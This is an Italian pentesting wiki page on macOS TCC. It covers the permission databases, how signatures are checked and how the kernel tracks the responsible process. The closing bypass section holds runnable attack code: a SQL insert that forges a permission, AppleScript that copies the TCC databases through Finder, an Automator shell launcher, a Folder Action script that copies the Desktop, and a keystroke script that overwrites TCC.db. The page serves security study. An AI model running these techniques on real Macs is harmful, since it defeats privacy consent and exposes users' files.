# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Informazioni di base**

**TCC (Transparency, Consent, and Control)** è un protocollo di sicurezza che regola le autorizzazioni delle applicazioni. Il suo ruolo principale è proteggere funzionalità sensibili come **servizi di localizzazione, contatti, foto, microfono, fotocamera, accessibilità e accesso completo al disco**. Richiedendo il consenso esplicito dell'utente prima di concedere alle app l'accesso a questi elementi, TCC migliora la privacy e il controllo degli utenti sui propri dati.

Gli utenti interagiscono con TCC quando le applicazioni richiedono l'accesso a funzionalità protette. Ciò avviene tramite una richiesta che consente agli utenti di **approvare o negare l'accesso**. Inoltre, TCC supporta azioni dirette dell'utente, come **trascinare e rilasciare file in un'applicazione**, per concedere l'accesso a file specifici, garantendo che le applicazioni possano accedere solo a ciò che è stato esplicitamente autorizzato.

![Esempio di richiesta TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

TCC è gestito dal **daemon** che si trova in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` e configurato in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (che registra il servizio mach `com.apple.tccd.system`).

È in esecuzione un **tccd in modalità utente** per ogni utente connesso, definito in `/System/Library/LaunchAgents/com.apple.tccd.plist`, che registra i servizi mach `com.apple.tccd` e `com.apple.usernotifications.delegate.com.apple.tccd`.

Qui puoi vedere tccd in esecuzione come sistema e come utente:

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

I permessi sono **ereditati dall'applicazione padre** e vengono **tracciati** in base al **Bundle ID** e al **Developer ID**.

### Database TCC

Le autorizzazioni e i dinieghi vengono quindi memorizzati in alcuni database TCC:

- Il database a livello di sistema in **`/Library/Application Support/com.apple.TCC/TCC.db`**.
  - Questo database è **protetto da SIP**, quindi solo un bypass di SIP può scrivervi.
- Il database TCC dell'utente **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**, per le preferenze specifiche dell'utente.
  - Questo database è protetto: solo i processi con privilegi TCC elevati, come Full Disk Access, possono scrivervi (ma non è protetto da SIP).

> [!WARNING]
> Anche i database precedenti sono **protetti da TCC per l'accesso in lettura**. Quindi **non potrai leggere** il database TCC del tuo utente, a meno che tu non lo faccia da un processo con privilegi TCC.
>
> Tuttavia, ricorda che un processo con questi privilegi elevati (come **FDA** o **`kTCCServiceEndpointSecurityClient`**) potrà scrivere nel database TCC dell'utente.

- Esiste un **terzo** database TCC in **`/var/db/locationd/clients.plist`** che indica i client autorizzati ad **accedere ai servizi di localizzazione**.
- **`/Library/Application Support/com.apple.TCC/REG.db`** registra i percorsi dei database TCC registrati. Un database utente inserito manualmente potrebbe essere rifiutato se non è registrato; conoscere questo percorso, da solo, non concede l'accesso a nessuno dei due database.<sup>[[6]](#references)</sup>
- **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`** contiene le decisioni gestite di Privacy Preferences Policy Control (PPPC). Controllalo quando un'app ha un'autorizzazione gestita che non compare nelle normali righe `access`.<sup>[[7]](#references)</sup>
- Il file protetto da SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (ma leggibile da chiunque) è una lista di applicazioni che richiedono un'eccezione TCC.

> [!TIP]
> Il database TCC in **iOS** si trova in **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> L'**interfaccia del Centro Notifiche** può apportare **modifiche al database TCC di sistema**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Tuttavia, gli utenti possono **reimpostare le regole** con l’utility da riga di comando **`tccutil`**; non dispone di un’operazione di query documentata.<sup>[[4]](#references)</sup>

#### Interrogare i database

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> Controllando entrambi i database puoi verificare quali autorizzazioni un'app ha consentito, vietato o non ha (in tal caso le verranno richieste).

- **`service`** è la rappresentazione sotto forma di stringa dell'**autorizzazione** TCC
- **`client`** è il **bundle ID** o il **percorso del binario** a cui sono associate le autorizzazioni
- **`client_type`** indica se si tratta di un Bundle Identifier(0) o di un percorso assoluto(1)

<details>

<summary>Come eseguire se si tratta di un percorso assoluto</summary>

Basta eseguire **`launctl load you_bin.plist`**, con un plist simile a:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- **`auth_value`** può avere valori diversi: denied(0), unknown(1), allowed(2) o limited(3).
- **`auth_reason`** può assumere i seguenti valori: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Il campo **csreq** indica come verificare il binario da eseguire e concedergli i permessi TCC:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- Per ulteriori informazioni sugli **altri campi** della tabella, [**consulta questo post del blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Puoi anche controllare le **autorizzazioni già concesse** alle app in `Preferenze di Sistema --> Sicurezza e Privacy --> Privacy --> File e cartelle`.

> [!TIP]
> Gli utenti possono **reimpostare** le regole usando **`tccutil`**, ma devono esaminare i database per consultare le autorizzazioni concesse.<sup>[[4]](#references)</sup>

#### Reimpostare le autorizzazioni TCC

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### Identificare le autorizzazioni del mittente e del destinatario per gli Apple Events

Un'autorizzazione Automation è una decisione **da mittente a destinatario**, non un'autorizzazione a controllare tutte le app. Se hai accesso al database utente, elenca le coppie mittente/destinatario consentite prima di provare i workflow con [Apple Events](macos-apple-events.md) o Finder riportati di seguito. `csreq` identifica il mittente e `indirect_object_code_identity` identifica il destinatario; decodifica ciascun blob non nullo con il metodo `csreq` descritto sopra.<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### Controlli della firma TCC

Il **database** TCC memorizza il **Bundle ID** dell'applicazione, ma **memorizza** anche **informazioni** sulla **firma** per **assicurarsi** che l'app che richiede di usare un'autorizzazione sia quella corretta.

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> Pertanto, altre applicazioni che usano lo stesso nome e bundle ID non potranno accedere alle autorizzazioni concesse ad altre app.

### Entitlements e autorizzazioni TCC

Una concessione TCC non prevale sulle restrizioni di **App Sandbox**. Un client sandboxed che usa la fotocamera necessita di `com.apple.security.device.camera`; Apple rende disponibile questa funzionalità anche alle app con Hardened Runtime. Nessuno dei due entitlement aggira la richiesta separata di consenso all'utente. Non considerare l'entitlement sandbox un prerequisito assoluto per ogni processo non sandboxed. Se una richiesta fallisce, verifica sia gli entitlement dell'eseguibile sia l'app responsabile.<sup>[[8]](#references)[[9]](#references)</sup>

Nota che gli entitlement sono file plist e fanno parte della code sig; vengono ulteriormente sottoposti ad hashing nella code sig tramite slot speciali e possono essere interrogati nel kernel dal codice del kernel oppure dal codice in modalità utente tramite `csops(#169)` o `csops_audittoken(#170)`.

Tuttavia, per **accedere** a **determinate cartelle dell'utente**, come `~/Desktop`, `~/Downloads` e `~/Documents`, le app **non hanno bisogno** di **entitlement** specifici. Il sistema gestirà l'accesso in modo trasparente e **chiederà il consenso all'utente** quando necessario.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Le app di Apple **non generano prompt**. Nell'elenco dei loro **entitlement** sono inclusi **diritti preconcessi**, quindi **non genereranno mai popup** e **non** compariranno in nessuno dei **database TCC**. Per esempio:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

Questo impedirà a Calendar di chiedere all’utente l’accesso a promemoria, calendario e rubrica.

> [!TIP]
> Oltre ad alcuni documenti ufficiali sugli entitlement, è possibile trovare anche **informazioni interessanti non ufficiali sugli entitlement** in [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Alcuni permessi TCC sono: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Non esiste un elenco pubblico che li definisca tutti, ma puoi consultare questo [**elenco di quelli conosciuti**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Percorsi sensibili non protetti

- $HOME (itself)
- $HOME/.ssh, $HOME/.aws, etc
- /tmp

### Intento dell’utente / com.apple.macl

Come accennato in precedenza, è possibile **concedere a un’app l’accesso a un file trascinandolo e rilasciandolo sull’app**. Questo accesso non verrà specificato in alcun database TCC, ma come **attributo esteso** **del file**. Questo attributo **memorizzerà l’UUID** dell’app autorizzata:<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> È curioso che l’attributo **`com.apple.macl`** sia gestito da **Sandbox**, non da tccd.
>
> Nota inoltre che, se sposti su un altro computer un file che consente l’accesso all’UUID di un’app sul tuo computer, non verrà concesso l’accesso a quell’app, perché la stessa app avrà UID diversi.

L’attributo esteso `com.apple.macl` **non può essere rimosso** come gli altri attributi estesi, perché è **protetto da SIP**. Tuttavia, come [**spiegato in questo post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), è possibile disabilitarlo **comprimendo** il file, **eliminandolo** e **decomprimendolo**.<sup>[[3]](#references)</sup>






## Meccanismo XNU del processo responsabile

In macOS/iOS, il meccanismo del **processo responsabile** è una funzionalità di sicurezza fondamentale usata dal framework **TCC (Transparency, Consent, and Control)** e da altri sistemi di sicurezza per tracciare quale processo è, in ultima analisi, responsabile di un’azione, anche attraverso catene di processi figli.

Quando TCC verifica le autorizzazioni (ad es. fotocamera, microfono, posizione), non controlla sempre il processo che effettua direttamente la richiesta. Controlla invece il **processo responsabile**: in genere l’applicazione GUI che ha avviato l’azione, anche se la richiesta effettiva proviene da un processo helper o da un daemon.

Per identificare l’app effettivamente attribuita a una richiesta, trasmetti in streaming i messaggi `AttributionChain` di TCC mentre esegui l’operazione protetta. È più affidabile che assegnare un’autorizzazione all’eseguibile helper solo perché ha effettuato la chiamata API. Confronta l’identità riportata con il bundle ID o il percorso e con il requisito di firma nella riga `access` pertinente.<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>Come viene impostato il processo responsabile</summary>

### Campi della struttura del processo

Ogni processo in XNU mantiene due identificatori UUID fondamentali:

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**: UUID del processo (dal comando di caricamento `LC_UUID` del suo binario Mach-O)
- **`p_responsible_pid`**: PID del processo responsabile
- **`p_responsible_uuid`**: UUID del processo responsabile (persiste anche dopo la terminazione del processo)

### Come viene impostato il processo responsabile

1. **Durante la creazione del processo (Fork)**

Quando viene creato un nuovo processo tramite `fork()` o `posix_spawn()`, il processo responsabile viene ereditato dal processo padre (la syscall `exec()` riutilizza la struttura `proc` esistente, quindi questo passaggio non viene ripetuto):

**Posizione**: `bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**Punti chiave:**
- I processi figli **ereditano** il `p_responsible_pid` del processo padre
- Questo crea una **catena di responsabilità** nella gerarchia dei processi
- Il processo responsabile punta in genere all'applicazione GUI originale

2. **La funzione principale: `proc_set_responsible_pid()`**

**Posizione**: `bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**Cosa fa questa funzione:**
1. **Imposta il PID responsabile** nel processo di destinazione
2. **Cerca il processo responsabile** usando `proc_find()` (incrementa il contatore di riferimenti)
3. **Copia l'UUID** da `p_uuid` del processo responsabile a `p_responsible_uuid` del processo di destinazione
4. **Rilascia il riferimento** con `proc_rele()` (decrementa il contatore di riferimenti)

3. **Perché memorizzare sia il PID che l'UUID?**

L'approccio a doppia memorizzazione risolve un problema critico:

| Campo | Scopo | Problema | Soluzione |
|-------|-------|----------|----------|
| `p_responsible_pid` | Ricerca rapida del processo corrente | Il PID può essere riutilizzato dopo la chiusura del processo | Usato per cercare i processi attivi |
| `p_responsible_uuid` | Identificazione persistente | Sopravvive alla terminazione del processo | Usato per i controlli di sicurezza e gli audit |

**Il problema**: se il processo responsabile termina prima del processo figlio, il PID potrebbe essere riciclato e assegnato a un processo completamente diverso.

**La soluzione**: l'UUID è immutabile e identifica in modo univoco il binario specifico responsabile, anche dopo la sua terminazione.

### Flusso di creazione del processo

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### Origine dell'UUID: comando di caricamento LC_UUID

L'UUID memorizzato in `p_uuid` proviene dal **comando di caricamento `LC_UUID` dell'eseguibile Mach-O**:

1. **Tempo di compilazione**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **Tempo di esecuzione**

**Posizione**: `bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **Memorizzato nella struttura del processo**

**Location**: `bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**Posizione**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Inserimento in TCC

Se a un certo punto riesci a ottenere l’accesso in scrittura a un database TCC, puoi usare qualcosa di simile a quanto segue per aggiungere una voce (rimuovi i commenti):

<details>

<summary>Esempio di inserimento in TCC</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### Payload TCC

Se sei riuscito a entrare in un'app con alcune autorizzazioni TCC, consulta la pagina seguente sui payload TCC per abusarne:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Scopri di più sugli Apple Events in:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automazione (Finder) per FDA\*

Il nome TCC dell'autorizzazione Automation è: **`kTCCServiceAppleEvents`**\
Questa specifica autorizzazione TCC indica anche **l'applicazione che può essere gestita** all'interno del database TCC (quindi le autorizzazioni non consentono di gestire tutto).

**Finder** è un'applicazione che **ha sempre FDA** (anche se non appare nell'interfaccia utente), quindi, se hai privilegi di **Automation** su di essa, puoi abusare dei suoi privilegi per **farle eseguire alcune azioni**.\
In questo caso, la tua app avrebbe bisogno dell'autorizzazione **`kTCCServiceAppleEvents`** su **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

Una variante di scrittura segnalata, quando è disponibile un percorso di Automation verso Finder, consiste nel far **rinominare a Finder la directory `com.apple.TCC` dell’utente**. Il database nel percorso rinominato veniva quindi copiato in una directory di staging, modificato lì, copiato di nuovo e infine veniva ripristinato il nome originale della directory. La nuova riga `kTCCServiceAppleEvents` deve identificare **sia il binario mittente sia Finder**, inclusi i rispettivi requisiti del codice; concedere l’autorizzazione al mittente senza identificare il target non è equivalente. Questa tecnica dipende dal percorso, quindi verificala sulla versione di macOS target invece di presumere che la sola Automation di Finder consenta scritture arbitrarie nel database.<sup>[[11]](#references)</sup>

> [!WARNING]
> Con questa autorizzazione potrai **chiedere a Finder di accedere alle cartelle soggette a restrizioni TCC** e di fornirti i file, ma, per quanto ne so, **non potrai far eseguire a Finder codice arbitrario** per abusare completamente del suo accesso FDA.
>
> Pertanto, non potrai abusare di tutte le funzionalità FDA.

Questo è il prompt TCC per ottenere i privilegi di Automation su Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Tieni presente che, poiché l’app **Automator** dispone dell’autorizzazione TCC **`kTCCServiceAppleEvents`**, può **controllare qualsiasi app**, come Finder. Quindi, disponendo dell’autorizzazione per controllare Automator, potresti controllare anche **Finder** con un codice come quello riportato di seguito:

<details>

<summary>Ottieni una shell dentro Automator</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

Lo stesso accade con l'app **Script Editor**: può controllare Finder, ma con un AppleScript non è possibile costringerla a eseguire uno script.

### Automazione (SE) verso alcune cartelle TCC

**System Events può creare Folder Actions, che possono accedere ad alcune cartelle TCC** (Scrivania, Documenti e Download), quindi è possibile usare uno script come il seguente per abusare di questo comportamento:

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Automazione (SE) + Accessibilità (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**) per FDA*

L’automazione di **`System Events`** + Accessibilità (**`kTCCServicePostEvent`**) consente di inviare **battute da tastiera ai processi**. In questo modo potresti sfruttare Finder per modificare il TCC.db dell’utente o concedere FDA a un’app arbitraria (anche se potrebbe essere richiesta la password).

Esempio di sovrascrittura del TCC.db dell’utente tramite Finder:

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
    set homePath to system attribute "HOME"

    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility` a FDA\*

Controlla questa pagina per alcuni [**payload per abusare delle autorizzazioni di Accessibility**](macos-tcc-payloads.md#accessibility), ottenere privesc a FDA\* o, per esempio, eseguire un keylogger.

### **Endpoint Security Client a FDA**

Se hai **`kTCCServiceEndpointSecurityClient`**, hai FDA. Fine.

### System Policy SysAdmin File a FDA

**`kTCCServiceSystemPolicySysAdminFiles`** consente di **modificare** l'attributo **`NFSHomeDirectory`** di un utente, cambiandone la cartella home e consentendo così di **bypassare TCC**.<sup>[[5]](#references)</sup>

### Database TCC dell'utente a FDA

Ottenendo **permessi di scrittura** sul database **TCC dell'utente**, **non** puoi concederti i permessi **`FDA`**: solo il database di sistema può concederli.

Puoi però concederti **diritti di Automation per Finder** e abusare della tecnica precedente per ottenere FDA*.

### **Da FDA ai permessi TCC**

Il nome TCC di **Full Disk Access** è **`kTCCServiceSystemPolicyAllFiles`**

Non credo che si tratti di una vera privesc, ma potrebbe esserti utile: se controlli un programma con FDA, puoi **modificare il database TCC dell'utente e concederti qualsiasi accesso**. Può essere utile come tecnica di persistenza nel caso in cui perdessi i tuoi permessi FDA.

### **Da SIP Bypass a TCC Bypass**

Il **database TCC** di sistema è protetto da **SIP**; per questo solo i processi con gli **entitlements indicati potranno modificarlo**. Pertanto, se un attacker trova un **SIP bypass** su un **file** (riuscendo a modificare un file protetto da SIP), potrà:

- **Rimuovere la protezione** di un database TCC e concedersi tutti i permessi TCC. Potrebbe abusare, ad esempio, di uno di questi file:
  - Il database TCC di sistema
  - REG.db
  - MDMOverrides.plist

